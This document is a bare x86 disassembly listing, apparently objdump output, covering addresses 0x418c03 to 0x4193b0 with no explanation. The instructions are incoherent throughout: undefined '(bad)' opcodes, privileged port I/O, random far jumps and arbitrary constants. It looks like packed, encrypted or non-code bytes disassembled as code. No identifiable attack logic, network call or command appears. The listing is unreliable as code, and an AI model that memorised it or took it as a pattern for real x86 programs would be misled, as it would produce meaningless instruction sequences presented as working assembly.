  418c03:	mov    esp,0xb1ada8e7
  418c08:	fcomp  QWORD PTR [edx]
  418c0a:	adc    edi,DWORD PTR [ebx-0x5fd1ac74]
  418c10:	xlat   BYTE PTR ds:[ebx]
  418c11:	mov    eax,0xb046899e
  418c16:	push   ss
  418c17:	mov    ebp,0x5881a81c
  418c1c:	out    0x19,eax
  418c1e:	fnsave [eax-0x4f]
  418c21:	or     BYTE PTR [ebx+0x5f],0x94
  418c25:	dec    esi
  418c26:	cmc    
  418c27:	enter  0xda1a,0x3a
  418c2b:	mov    ch,dl
  418c2d:	adc    al,0x84
  418c2f:	dec    esi
  418c30:	dec    esi
  418c31:	xchg   ecx,eax
  418c32:	ds jo  0x418c97
  418c35:	outs   dx,DWORD PTR ds:[esi]
  418c36:	and    DWORD PTR [ecx],ebx
  418c38:	jo     0x418c5c
  418c3a:	and    BYTE PTR [edx-0x26],dl
  418c3d:	gs jne 0x418c26
  418c40:	outs   dx,DWORD PTR ds:[esi]
  418c41:	mov    dh,0xf0
  418c43:	dec    esp
  418c44:	loopne 0x418c83
  418c46:	inc    esi
  418c47:	lds    edi,FWORD PTR [edi+eiz*1-0xc6095ec]
  418c4e:	pop    ecx
  418c4f:	mov    WORD PTR [edi+ebp*2+0x18],ds
  418c53:	xchg   esi,eax
  418c54:	ins    DWORD PTR es:[edi],dx
  418c55:	outs   dx,BYTE PTR ds:[esi]
  418c56:	shl    BYTE PTR [esi],1
  418c58:	sub    eax,0x51578f96
  418c5d:	jle    0x418c58
  418c5f:	aam    0x2c
  418c61:	mov    ecx,0x3fbed569
  418c66:	sahf   
  418c67:	stc    
  418c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c69:	test   eax,0x3f74fac7
  418c6e:	ja     0x418c90
  418c70:	jl     0x418bf3
  418c72:	loopne 0x418c2c
  418c74:	pop    edx
  418c75:	xor    eax,0x760d6c52
  418c7a:	xchg   BYTE PTR [esi-0x67244920],cl
  418c80:	cmp    edx,ebx
  418c82:	dec    edx
  418c83:	jl     0x418c9b
  418c85:	adc    DWORD PTR [esi-0x42b99002],esi
  418c8b:	enter  0x8aea,0xe6
  418c8f:	fidivr WORD PTR [ecx+edi*8-0x15]
  418c93:	jmp    0x7136fc66
  418c98:	inc    edi
  418c99:	leave  
  418c9a:	mov    ds:0xf71838e8,eax
  418c9f:	inc    eax
  418ca0:	rcl    BYTE PTR [edx-0x47],0xbf
  418ca4:	mov    ss,WORD PTR [edx-0x1d8bbcb6]
  418caa:	xchg   BYTE PTR [ebx-0x17],cl
  418cad:	mov    al,BYTE PTR [edx+0x4fcf6902]
  418cb3:	ja     0x418c3f
  418cb5:	movzx  ecx,WORD PTR [ebp+0xf]
  418cb9:	inc    ebx
  418cba:	popf   
  418cbb:	sbb    bh,BYTE PTR [ebp+0x3ce7dabc]
  418cc1:	clc    
  418cc2:	mov    ds:0xcaa06526,al
  418cc7:	pop    ss
  418cc8:	test   al,0xae
  418cca:	adc    DWORD PTR [esi],esp
  418ccc:	in     eax,dx
  418ccd:	hlt    
  418cce:	mov    dh,0x80
  418cd0:	ret    0xcc8b
  418cd3:	nop
  418cd4:	iret   
  418cd5:	add    al,0x5f
  418cd7:	fistp  WORD PTR [ebp+0x54]
  418cda:	and    eax,0x87fb8d3e
  418cdf:	sub    esp,eax
  418ce1:	adc    ah,cl
  418ce3:	push   eax
  418ce4:	inc    ebp
  418ce5:	dec    ebx
  418ce6:	scas   al,BYTE PTR es:[edi]
  418ce7:	mov    cl,0x2
  418ce9:	push   0xffffffb2
  418ceb:	aas    
  418cec:	push   cs
  418ced:	lds    esp,FWORD PTR [ebp+0x4caf23cd]
  418cf3:	inc    esi
  418cf4:	frstor [edi-0x352f21f4]
  418cfa:	push   ss
  418cfb:	lods   eax,DWORD PTR ds:[esi]
  418cfc:	in     al,dx
  418cfd:	retf   
  418cfe:	mov    al,0x80
  418d00:	fdivr  QWORD PTR [eax+edx*8]
  418d03:	bound  esi,QWORD PTR [eax+0x75]
  418d06:	arpl   ax,cx
  418d08:	add    BYTE PTR ds:0xab9961e2,dl
  418d0e:	sub    cl,ah
  418d10:	sti    
  418d11:	or     cl,BYTE PTR [ebp-0x1d0addb1]
  418d17:	js     0x418d38
  418d19:	cmp    DWORD PTR [ecx],ebp
  418d1b:	inc    ebp
  418d1c:	dec    ebx
  418d1d:	addr16 push eax
  418d1f:	inc    edx
  418d20:	mov    BYTE PTR ds:0xef6e0f1f,cl
  418d26:	cld    
  418d27:	pushw  0x5b87
  418d2b:	push   esp
  418d2c:	dec    ebx
  418d2d:	mov    cl,0xf3
  418d2f:	fcmovnu st,st(4)
  418d31:	add    al,0xd3
  418d33:	cmp    al,0x77
  418d35:	and    DWORD PTR [ebp-0x6f28136b],edi
  418d3b:	stos   DWORD PTR es:[edi],eax
  418d3c:	jbe    0x418ccb
  418d3e:	push   edi
  418d3f:	xchg   esp,eax
  418d40:	mov    bh,0x81
  418d42:	bound  esi,QWORD PTR [edi]
  418d44:	push   ds
  418d45:	or     cl,dh
  418d47:	cdq    
  418d48:	mov    esi,0xe27ff80c
  418d4d:	cmp    DWORD PTR [edi],eax
  418d4f:	pop    es
  418d50:	mov    DWORD PTR [ebp-0x5f4afc5],edx
  418d56:	add    DWORD PTR [edx-0x4dc4ba72],edx
  418d5c:	imul   eax,DWORD PTR [eax+edi*8],0xffffff83
  418d60:	lea    eax,[ebp+0xd]
  418d63:	daa    
  418d64:	mov    eax,ds:0x8a197833
  418d69:	and    eax,0x3e407e3b
  418d6e:	cwde   
  418d6f:	push   ebp
  418d70:	pop    ebp
  418d71:	out    0x61,al
  418d73:	jo     0x10064df8
  418d79:	xchg   esp,esi
  418d7b:	pop    edx
  418d7c:	mov    ds:0xf25d2e97,eax
  418d81:	fs cwde 
  418d83:	aam    0xe2
  418d85:	retf   0xa431
  418d88:	mov    dl,0xf8
  418d8a:	xor    eax,0xcb513545
  418d8f:	popf   
  418d90:	xlat   BYTE PTR ds:[ebx]
  418d91:	cmp    eax,esi
  418d93:	adc    al,0x93
  418d95:	enter  0x6711,0x3e
  418d99:	mov    edx,0x7ad2cb9a
  418d9e:	sbb    ecx,edi
  418da0:	lods   al,BYTE PTR ds:[esi]
  418da1:	pop    eax
  418da2:	xchg   ecx,eax
  418da3:	nop
  418da4:	ins    DWORD PTR es:[edi],dx
  418da5:	popa   
  418da6:	ss (bad) 
  418da8:	sub    al,0xc3
  418daa:	jg     0x418dfd
  418dac:	cmp    DWORD PTR [edi+0x3b11b1c7],0x4851faf2
  418db6:	retf   0x692c
  418db9:	ins    BYTE PTR es:[edi],dx
  418dba:	jb     0x418e33
  418dbc:	sub    ah,0x42
  418dbf:	pop    ebp
  418dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dc1:	push   ebp
  418dc2:	cmp    DWORD PTR [edx],ecx
  418dc4:	jecxz  0x418e2b
  418dc6:	sbb    DWORD PTR [ecx+0x5d],edi
  418dc9:	ror    BYTE PTR [eax-0x7cdefd6],cl
  418dcf:	pop    ebp
  418dd0:	mov    ebp,0x282b26c0
  418dd5:	push   ss
  418dd6:	jmp    0x76ab139c
  418ddb:	add    eax,0x523eea80
  418de0:	adc    edx,DWORD PTR [edx-0x403bdc31]
  418de6:	out    dx,eax
  418de7:	dec    esi
  418de8:	(bad)  
  418de9:	cmp    ebx,DWORD PTR [eax-0x5b]
  418dec:	loopne 0x418d9a
  418dee:	add    al,bh
  418df0:	jmp    0xfce1:0xc78657f0
  418df7:	dec    ebx
  418df8:	sbb    al,0x82
  418dfa:	ficom  WORD PTR [ecx]
  418dfc:	mov    ds:0x91b6fe25,eax
  418e01:	lock xchg edi,eax
  418e03:	sub    ebp,esi
  418e05:	pop    ds
  418e06:	sub    DWORD PTR [edi],0xa7bd1bf0
  418e0c:	jp     0x418dd2
  418e0e:	push   edi
  418e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e10:	jp     0x418db5
  418e12:	dec    esi
  418e13:	popa   
  418e14:	cmp    BYTE PTR [ecx+0x2b9a9d8c],bl
  418e1a:	dec    ebx
  418e1b:	jge    0x418dc0
  418e1d:	sub    al,0xe
  418e1f:	push   ss
  418e20:	pop    ds
  418e21:	in     al,0x7c
  418e23:	jne    0x418e0f
  418e25:	dec    ebp
  418e26:	fwait
  418e27:	jo     0x418e92
  418e29:	lea    ebp,[ebx-0x34d3ae3e]
  418e2f:	mov    bh,0xb3
  418e31:	rcr    DWORD PTR [ecx],cl
  418e33:	lds    ebp,FWORD PTR [esi+0x1e039fc3]
  418e39:	rcl    DWORD PTR [ebp-0x4e971248],1
  418e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e40:	sbb    BYTE PTR [eax-0x67],bl
  418e43:	cmp    edi,edi
  418e45:	xchg   DWORD PTR [ebp-0x69],ebx
  418e48:	cs mov eax,0x55e2ae0e
  418e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e4f:	std    
  418e50:	jle    0x418e15
  418e52:	fimul  WORD PTR [ecx+0x3469e203]
  418e58:	cld    
  418e59:	popf   
  418e5a:	fldcw  WORD PTR [ebx-0x6a05fb6]
  418e60:	dec    edx
  418e61:	push   ds
  418e62:	and    esi,DWORD PTR [eax]
  418e64:	in     eax,dx
  418e65:	or     dh,bh
  418e67:	sub    ebx,0x2a
  418e6a:	(bad)  
  418e6b:	dec    esp
  418e6c:	mov    ds:0x87aa00bf,al
  418e71:	and    eax,0x4bc6a89e
  418e76:	fcmovnbe st,st(4)
  418e78:	aad    0xc5
  418e7a:	popf   
  418e7b:	mov    esi,0xdc59d57a
  418e80:	ret    0xb11e
  418e83:	pop    edi
  418e84:	ret    0xdba
  418e87:	push   ss
  418e88:	pusha  
  418e89:	loop   0x418e88
  418e8b:	mov    BYTE PTR ds:0x4595afec,0x79
  418e92:	nop
  418e93:	fld    TBYTE PTR [ebp+0x43]
  418e96:	push   esp
  418e97:	xchg   ebx,eax
  418e98:	jo     0x418e76
  418e9a:	adc    ecx,DWORD PTR [edx+0x248dc43d]
  418ea0:	push   ss
  418ea1:	add    DWORD PTR [ecx],edi
  418ea3:	stc    
  418ea4:	fsub   DWORD PTR [esi+0x7d]
  418ea7:	xchg   ebx,eax
  418ea8:	jo     0x418e98
  418eaa:	bound  ebx,QWORD PTR [eax+0x290cdab7]
  418eb0:	popf   
  418eb1:	mov    WORD PTR [ecx+0xd],ds
  418eb4:	push   es
  418eb5:	jne    0x418e7a
  418eb7:	or     BYTE PTR [ebx-0x8807e94],al
  418ebd:	lahf   
  418ebe:	push   esi
  418ebf:	pop    edi
  418ec0:	mov    esi,0x8b01c62c
  418ec5:	js     0x418f1f
  418ec7:	jo     0x418e80
  418ec9:	push   ebx
  418eca:	pop    edx
  418ecb:	sbb    ah,al
  418ecd:	xor    al,0x8b
  418ecf:	sbb    ebx,DWORD PTR [eax-0x44]
  418ed2:	retf   0x1658
  418ed5:	push   esp
  418ed6:	push   ds
  418ed7:	cmc    
  418ed8:	int    0x98
  418eda:	mov    dl,0xde
  418edc:	(bad)  
  418edd:	jl     0x418ecc
  418edf:	mov    bh,0xfc
  418ee1:	adc    al,0xbc
  418ee3:	dec    esi
  418ee4:	fsubr  st,st(1)
  418ee6:	sub    al,0x7
  418ee8:	jns    0x418eaf
  418eea:	int    0x56
  418eec:	dec    esp
  418eed:	xchg   ebx,eax
  418eee:	cmp    DWORD PTR [ecx+0x607e0b74],0x51
  418ef5:	cmp    bh,0x93
  418ef8:	push   cs
  418ef9:	or     bl,ah
  418efb:	rol    BYTE PTR [edi+0x40],1
  418efe:	(bad)  
  418f00:	ins    BYTE PTR es:[edi],dx
  418f01:	xor    edx,DWORD PTR [edx]
  418f03:	jmp    DWORD PTR [edi]
  418f05:	or     ah,BYTE PTR [eax]
  418f07:	es sbb al,0xf5
  418f0a:	mov    bl,0xd2
  418f0c:	sub    BYTE PTR [edi],ah
  418f0e:	add    DWORD PTR [ebx],ebp
  418f10:	int    0x4
  418f12:	lods   al,BYTE PTR ds:[esi]
  418f13:	stos   DWORD PTR es:[edi],eax
  418f14:	xor    esp,ecx
  418f16:	ins    BYTE PTR es:[edi],dx
  418f17:	mov    esp,DWORD PTR [ebx]
  418f19:	mov    ecx,0x923697cb
  418f1e:	push   ds
  418f1f:	popa   
  418f20:	shl    BYTE PTR [ebx+0x19],cl
  418f23:	jmp    0x4e894d8
  418f28:	out    dx,al
  418f29:	ret    0xce5d
  418f2c:	cmp    esp,DWORD PTR [ebp+edx*1-0x4c834f0e]
  418f33:	mov    esi,0xa34d7784
  418f38:	mov    eax,0xe70f916a
  418f3d:	pop    ds
  418f3e:	xor    DWORD PTR [ebx],edi
  418f40:	dec    ecx
  418f41:	fst    QWORD PTR [ebp+0x2d]
  418f44:	jmp    0xbd77:0xfdd9cb5e
  418f4b:	imul   BYTE PTR [esi+0x15]
  418f4e:	jecxz  0x418ed5
  418f50:	or     eax,DWORD PTR [edi]
  418f52:	lds    ecx,FWORD PTR [ebp+0x3d]
  418f55:	out    0xc1,al
  418f57:	inc    edx
  418f58:	jb     0x418f90
  418f5a:	nop
  418f5b:	sub    BYTE PTR [ebx-0x46],bh
  418f5e:	iret   
  418f5f:	xor    BYTE PTR [esi+0x5c],bh
  418f62:	enter  0x37fd,0x22
  418f66:	and    dh,BYTE PTR [esi]
  418f68:	jg     0x418fbb
  418f6a:	push   edx
  418f6b:	ins    DWORD PTR es:[edi],dx
  418f6c:	xchg   edx,eax
  418f6d:	lods   eax,DWORD PTR ds:[esi]
  418f6e:	inc    edx
  418f6f:	ja     0x418fa6
  418f71:	cmp    dh,BYTE PTR [esp+ebp*2-0x6fcd0f2d]
  418f78:	inc    ebp
  418f79:	and    DWORD PTR [edx],ebp
  418f7b:	mov    eax,ds:0xff263b52
  418f80:	out    dx,al
  418f81:	in     eax,0x8a
  418f83:	push   es
  418f84:	sub    BYTE PTR [esi+0x6c475d26],bh
  418f8a:	not    dl
  418f8c:	lods   eax,DWORD PTR ds:[esi]
  418f8d:	ret    0x8f14
  418f90:	(bad)  [ebx+ecx*2-0x32fe918e]
  418f97:	scas   al,BYTE PTR es:[edi]
  418f98:	cld    
  418f99:	adc    eax,0x66b7d2ea
  418f9e:	js     0x418f2e
  418fa0:	int    0xff
  418fa2:	inc    edx
  418fa3:	test   al,0x54
  418fa5:	ret    
  418fa6:	adc    BYTE PTR ds:0x7b1c60d,al
  418fac:	jg     0x418f4a
  418fae:	or     DWORD PTR [eax],esi
  418fb0:	and    al,0x8
  418fb2:	and    eax,0x25ef747
  418fb7:	call   0x25f4:0x55706df7
  418fbe:	scas   al,BYTE PTR es:[edi]
  418fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc0:	push   ds
  418fc1:	fwait
  418fc2:	loopne 0x418fc2
  418fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc5:	out    dx,eax
  418fc6:	mov    bl,0xd9
  418fc8:	scas   al,BYTE PTR es:[edi]
  418fc9:	mov    ebx,0xf712d9f3
  418fce:	push   ebx
  418fcf:	mov    dh,0xe5
  418fd1:	mov    edx,0x8ad853e8
  418fd6:	xor    eax,0xd30f6ef9
  418fdb:	push   es
  418fdc:	xor    ebx,ecx
  418fde:	push   ecx
  418fdf:	mov    ch,0xa0
  418fe1:	mov    ebx,0xcfea905e
  418fe6:	out    0x23,al
  418fe8:	sub    al,bl
  418fea:	mov    dl,0x76
  418fec:	push   esp
  418fed:	xor    al,BYTE PTR [ecx-0x41]
  418ff0:	pop    esi
  418ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ff3:	sub    eax,0xc5e57bd7
  418ff8:	stos   BYTE PTR es:[edi],al
  418ff9:	or     al,0xfb
  418ffb:	adc    DWORD PTR [ecx+0x1c],esi
  418ffe:	dec    esi
  418fff:	xchg   esp,eax
  419000:	mov    bh,0x13
  419002:	xor    eax,0x76d7cec
  419007:	dec    ebx
  419008:	nop
  419009:	(bad)  
  41900a:	jle    0x418fc7
  41900c:	push   ebx
  41900d:	jmp    0x2f09:0x9d43b09a
  419014:	outs   dx,DWORD PTR ds:[esi]
  419015:	pop    edi
  419016:	jbe    0x418fa7
  419018:	jmp    0x505a0200
  41901d:	lods   eax,DWORD PTR ds:[esi]
  41901e:	cmp    eax,0xd8399fff
  419023:	mov    ebp,DWORD PTR [ebp+0x29]
  419026:	cmc    
  419027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419028:	dec    ebp
  419029:	mov    cl,0x6e
  41902b:	mov    edx,cr3
  41902e:	or     ebx,DWORD PTR [eax]
  419030:	xchg   ecx,eax
  419031:	sbb    esi,esp
  419033:	shl    DWORD PTR [edx],0x80
  419036:	xor    ecx,edi
  419038:	inc    esp
  419039:	lea    ebp,[esi-0x6ee7cb75]
  41903f:	mov    BYTE PTR [eax+0x24bb2f61],ch
  419045:	out    dx,eax
  419046:	jne    0x418fe8
  419048:	jne    0x418ff2
  41904a:	mov    esp,0xdd30c8e8
  41904f:	jne    0x4190a1
  419051:	adc    eax,0x43f9c80b
  419056:	outs   dx,BYTE PTR ds:[esi]
  419057:	fsubr  QWORD PTR [ecx+0x53]
  41905a:	je     0x418fe1
  41905c:	cdq    
  41905d:	push   esp
  41905e:	sub    BYTE PTR [esi],bl
  419060:	ds daa 
  419062:	je     0x41904f
  419064:	mov    ds:0x66200501,eax
  419069:	push   ss
  41906a:	adc    al,0x61
  41906c:	lds    edx,FWORD PTR [ebx]
  41906e:	inc    esp
  41906f:	add    eax,DWORD PTR [ecx+eax*2+0x52]
  419073:	scas   eax,DWORD PTR es:[edi]
  419074:	das    
  419075:	lds    eax,FWORD PTR [edi+0x58]
  419078:	xchg   edi,eax
  419079:	adc    al,bh
  41907b:	mov    ch,0x4
  41907d:	rol    bh,1
  41907f:	mov    ds:0x84c2e3ae,al
  419084:	dec    ebp
  419085:	rcl    BYTE PTR [edi],1
  419087:	test   al,0x67
  419089:	lock adc cl,cl
  41908c:	jl     0x419079
  41908e:	std    
  41908f:	mov    eax,0xd8de7061
  419094:	add    al,0xfd
  419096:	add    eax,DWORD PTR ds:0x920137fd
  41909c:	test   BYTE PTR [edi],0xee
  41909f:	in     eax,dx
  4190a0:	call   DWORD PTR [ebp-0x3157d70]
  4190a6:	inc    ebx
  4190a7:	mov    ebp,0x5448ed4c
  4190ac:	xchg   edi,eax
  4190ad:	adc    eax,0x2421c303
  4190b2:	xchg   BYTE PTR [ecx+0x21],ah
  4190b5:	adc    bh,BYTE PTR [ecx+0x23]
  4190b8:	das    
  4190b9:	mov    ds:0x1b861a1b,eax
  4190be:	and    al,BYTE PTR [edi-0x1ca3c454]
  4190c4:	mov    eax,ds:0x145a1208
  4190c9:	push   0xffffff9c
  4190cb:	ins    BYTE PTR es:[edi],dx
  4190cc:	push   ebp
  4190cd:	sbb    edi,DWORD PTR [ebx+0x21]
  4190d0:	push   edx
  4190d1:	xor    al,0x60
  4190d3:	push   ss
  4190d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d5:	pop    esp
  4190d6:	call   0x6a168382
  4190db:	and    eax,0x21eb0588
  4190e0:	nop
  4190e1:	xlat   BYTE PTR ds:[ebx]
  4190e2:	inc    ebp
  4190e3:	in     al,0xe2
  4190e5:	push   ds
  4190e6:	ja     0x41914d
  4190e8:	mov    WORD PTR [edi+0xf],?
  4190eb:	pushf  
  4190ec:	lds    edx,FWORD PTR [ebx-0x49c92fba]
  4190f2:	xchg   BYTE PTR [eax],ch
  4190f4:	pop    esp
  4190f5:	mov    bh,BYTE PTR [eax-0xc]
  4190f8:	inc    eax
  4190f9:	sub    BYTE PTR [ecx+0x13],dl
  4190fc:	xor    bh,bh
  4190fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ff:	add    eax,0x8c227cc6
  419104:	cmp    bh,BYTE PTR [ecx-0x5a]
  419107:	fimul  WORD PTR [edx+eax*4]
  41910a:	mov    eax,0x96ce65cb
  41910f:	ins    BYTE PTR es:[edi],dx
  419110:	fstsw  WORD PTR [edi+0x3991d7f5]
  419117:	mov    fs:0xe83b8b56,eax
  41911d:	out    0xb7,eax
  41911f:	fild   QWORD PTR [ebx+0xe503d57]
  419125:	adc    ah,al
  419127:	mul    DWORD PTR [ebp-0x50b1aba6]
  41912d:	psubusw mm6,QWORD PTR [ebx+0x57]
  419131:	xor    BYTE PTR [eax+0x3bb273a],al
  419137:	sub    bl,BYTE PTR [edi]
  419139:	adc    ebx,DWORD PTR [ecx+edx*4-0x26]
  41913d:	xchg   esp,eax
  41913e:	xchg   BYTE PTR [ecx],bl
  419140:	xchg   ecx,eax
  419141:	push   edx
  419142:	arpl   WORD PTR ds:0xca19c43,sp
  419148:	or     esp,edi
  41914a:	jecxz  0x419113
  41914c:	adc    eax,0x7084ea02
  419151:	clc    
  419152:	mov    eax,0x5f0c9582
  419157:	lock je 0x41918d
  41915a:	pop    esi
  41915b:	push   ss
  41915c:	sbb    cl,BYTE PTR [ebx+0x573ea135]
  419162:	ins    BYTE PTR es:[edi],dx
  419163:	cld    
  419164:	gs lds esp,FWORD PTR ds:[esi]
  419168:	and    cl,BYTE PTR [ebp+0x7d]
  41916b:	clc    
  41916c:	and    al,BYTE PTR [ebp+0x6211b0d]
  419172:	xchg   esi,eax
  419173:	and    BYTE PTR [esi+ecx*2],al
  419176:	daa    
  419177:	lods   al,BYTE PTR ds:[esi]
  419178:	adc    eax,0xa776ad0a
  41917d:	aad    0x47
  41917f:	mov    ds:0xa9cff617,al
  419184:	sahf   
  419185:	ss cdq 
  419187:	ficom  WORD PTR fs:[edi+0x6a]
  41918b:	arpl   WORD PTR [edi+0x625c6635],bx
  419191:	sbb    BYTE PTR [edx-0x78],bl
  419194:	in     al,0x58
  419196:	jns    0x4191c8
  419198:	cli    
  419199:	and    esp,ebp
  41919b:	pop    edi
  41919c:	dec    esp
  41919d:	ja     0x4191e1
  41919f:	call   0x5a5d8cb2
  4191a4:	adc    BYTE PTR [ebp-0x79],al
  4191a7:	arpl   WORD PTR [ecx-0x59],di
  4191aa:	sti    
  4191ab:	pop    esp
  4191ac:	xor    edx,DWORD PTR [esp+edx*8]
  4191af:	js     0x41915a
  4191b1:	adc    ch,BYTE PTR [edi+0x2f83aa08]
  4191b7:	bound  eax,QWORD PTR [ecx-0x709c2f8d]
  4191bd:	sbb    ch,ch
  4191bf:	sahf   
  4191c0:	mov    esp,ebp
  4191c2:	hlt    
  4191c3:	and    al,0x27
  4191c5:	xor    eax,0xbd784b6b
  4191ca:	lea    ebp,[edx]
  4191cc:	add    eax,0xec73e582
  4191d1:	aas    
  4191d2:	retf   
  4191d3:	por    mm7,QWORD PTR [ebx-0x49f49cb6]
  4191da:	(bad)  
  4191db:	cld    
  4191dc:	in     eax,0x19
  4191de:	mov    ecx,DWORD PTR [esi-0x63677514]
  4191e4:	outs   dx,DWORD PTR ds:[esi]
  4191e5:	dec    ecx
  4191e6:	sbb    cl,BYTE PTR [ecx+edi*4+0x2831ae44]
  4191ed:	jecxz  0x419213
  4191ef:	sbb    ch,BYTE PTR [edi]
  4191f1:	ret    0x9af6
  4191f4:	aam    0x7f
  4191f6:	mov    al,0xf4
  4191f8:	jne    0x4191c1
  4191fa:	int    0x75
  4191fc:	cwde   
  4191fd:	cdq    
  4191fe:	cli    
  4191ff:	icebp  
  419200:	or     ebx,eax
  419202:	rol    BYTE PTR [edi+0x6d77028],1
  419208:	and    BYTE PTR [ebx],0x66
  41920b:	ror    DWORD PTR [edi],1
  41920d:	aam    0x20
  41920f:	xor    eax,0x2650d40f
  419214:	mov    ebp,DWORD PTR [esi-0x48]
  419217:	add    esp,DWORD PTR [edx-0x60512a37]
  41921d:	jmp    0x419246
  41921f:	ins    DWORD PTR es:[edi],dx
  419220:	outs   dx,DWORD PTR ds:[esi]
  419221:	pop    ecx
  419222:	ins    DWORD PTR es:[edi],dx
  419223:	cmp    eax,0x36dbce40
  419228:	dec    edx
  419229:	adc    DWORD PTR [eax-0x2a81385e],eax
  41922f:	xor    DWORD PTR [edi],edi
  419231:	cmp    ebx,DWORD PTR [esi+0x6e615712]
  419237:	or     DWORD PTR [esi+ebx*8],esp
  41923a:	daa    
  41923b:	mov    esp,0xa6edeef8
  419240:	pop    es
  419241:	inc    ebp
  419242:	sbb    dh,BYTE PTR [ebp-0x1bba4022]
  419248:	mov    dh,0x9f
  41924a:	xor    al,0x6a
  41924c:	inc    edx
  41924d:	(bad)  
  419250:	jmp    0x419297
  419252:	ds nop
  419254:	imul   ecx,DWORD PTR [ebp-0xf],0x5e
  419258:	(bad)  
  419259:	(bad)  
  41925a:	imul   esi,DWORD PTR [ebp-0x36],0x1f
  41925e:	mov    eax,0xb89f8460
  419263:	leave  
  419264:	xchg   edi,eax
  419265:	xor    DWORD PTR [edi-0x30e580e9],ebp
  41926b:	lahf   
  41926c:	clc    
  41926d:	adc    DWORD PTR [esi+ebp*2-0x3c],eax
  419271:	stos   BYTE PTR es:[edi],al
  419272:	loope  0x4192a2
  419274:	repz xor BYTE PTR [eax-0x673a2e15],dl
  41927b:	cld    
  41927c:	call   0xb878fdaa
  419281:	test   al,0x7b
  419283:	out    dx,al
  419284:	jge    0x419251
  419286:	xchg   ebp,eax
  419287:	mov    bh,0x3f
  419289:	lds    ebx,FWORD PTR [edi+0x2af3067a]
  41928f:	arpl   WORD PTR [ecx-0x325c28a7],si
  419295:	pop    esi
  419296:	and    edx,DWORD PTR [edx+0x9]
  419299:	xor    cl,al
  41929b:	idiv   ebp
  41929d:	pop    ebx
  41929e:	pop    ecx
  41929f:	xchg   ecx,eax
  4192a0:	xor    al,BYTE PTR [ecx-0x1caaa0ad]
  4192a6:	mov    ds:0xe4777b58,eax
  4192ab:	fidivr WORD PTR [edi+0x79dd8d26]
  4192b1:	rcl    ch,0xf1
  4192b4:	js     0x4192b3
  4192b6:	mov    al,0x32
  4192b8:	mov    al,0xb3
  4192ba:	mov    eax,0x8d3bf728
  4192bf:	lods   eax,DWORD PTR ds:[esi]
  4192c0:	sub    BYTE PTR [ecx-0x1a],0x52
  4192c4:	je     0x419248
  4192c6:	imul   edx,eax,0xe
  4192c9:	sbb    ah,BYTE PTR [edx+0x679b42cd]
  4192cf:	jnp    0x41927b
  4192d1:	adc    DWORD PTR [edx+0x53ef840],ebp
  4192d7:	mov    al,ds:0xf53f6bb6
  4192dc:	jmp    0xfb3c:0xeba2b32
  4192e3:	mov    eax,ds:0xd6348c76
  4192e8:	push   0xfffffff0
  4192ea:	push   ds
  4192eb:	das    
  4192ec:	lahf   
  4192ed:	mov    edi,DWORD PTR [edx-0x372117b8]
  4192f3:	es (bad) 
  4192f6:	outs   dx,BYTE PTR ds:[esi]
  4192f7:	or     edx,DWORD PTR [edi+0x2f]
  4192fa:	jge    0x4192b5
  4192fc:	sub    bl,BYTE PTR [eax-0x61]
  4192ff:	stc    
  419300:	clc    
  419301:	push   ebp
  419302:	mov    BYTE PTR [ebp+0x24],ah
  419305:	js     0x419298
  419307:	cmp    BYTE PTR [ebp-0x7f],dh
  41930a:	(bad)  
  41930b:	jmp    0x41932a
  41930d:	mov    bh,0x8c
  41930f:	sar    BYTE PTR [ebp+0x67],1
  419312:	cmp    dl,BYTE PTR [ecx+0x1e6f0a3a]
  419318:	cmp    eax,0x805bd8b7
  41931d:	xchg   ebp,eax
  41931e:	or     ecx,DWORD PTR [ebx]
  419320:	pop    esi
  419321:	xchg   ebp,eax
  419322:	scas   al,BYTE PTR es:[edi]
  419323:	retf   
  419324:	imul   ecx,DWORD PTR [edx+0x68],0x24
  419328:	mov    al,ds:0xd2d497c4
  41932d:	mov    cl,0x33
  41932f:	add    al,0x49
  419331:	and    al,0x15
  419333:	sbb    DWORD PTR [ecx],eax
  419335:	xchg   ebp,eax
  419336:	inc    ecx
  419337:	add    dl,bh
  419339:	adc    esi,DWORD PTR [ecx]
  41933b:	stos   BYTE PTR es:[edi],al
  41933c:	jns    0x4193b3
  41933e:	jecxz  0x41936b
  419340:	leave  
  419341:	jl     0x419321
  419343:	mov    ds:0x6e152ce1,al
  419348:	mov    ch,0x6c
  41934a:	dec    edi
  41934b:	push   edx
  41934c:	mov    esp,0x41d6aa84
  419351:	iret   
  419352:	inc    ecx
  419353:	mul    BYTE PTR [edx]
  419355:	test   BYTE PTR ds:0x6056a058,dl
  41935b:	mov    ch,0xad
  41935d:	jmp    0x4193d7
  41935f:	sbb    eax,0x322a0772
  419364:	cmp    eax,DWORD PTR [edx+0x58]
  419367:	sub    edi,edi
  419369:	xchg   ecx,eax
  41936a:	call   0x4a29dead
  41936f:	hlt    
  419370:	shl    DWORD PTR [eax-0x2c8aa9ac],1
  419376:	adc    dh,dl
  419378:	xor    al,0xfd
  41937a:	sbb    eax,0x769a815f
  41937f:	jmp    0xb296:0x7eea1b3e
  419386:	mov    ecx,0x4d1cd444
  41938b:	mov    ss,WORD PTR [edi+0x3aca4412]
  419391:	mov    bl,0x9d
  419393:	(bad)  
  419394:	out    0xf2,al
  419396:	(bad)  
  419397:	retf   
  419398:	push   0xffffff8f
  41939a:	add    al,0xdf
  41939c:	and    ah,0xd2
  41939f:	imul   edi,ebp,0x1d
  4193a2:	sub    al,0x7f
  4193a4:	(bad)  
  4193a5:	xchg   ebx,eax
  4193a6:	add    esp,esi
  4193a8:	mov    bh,0x5a
  4193aa:	jg     0x419428
  4193ac:	fdiv   QWORD PTR [ecx]
  4193ae:	jnp    0x4193bb
  4193b0:	cmp    BYTE PTR [ecx+esi*4-0x6f],ch
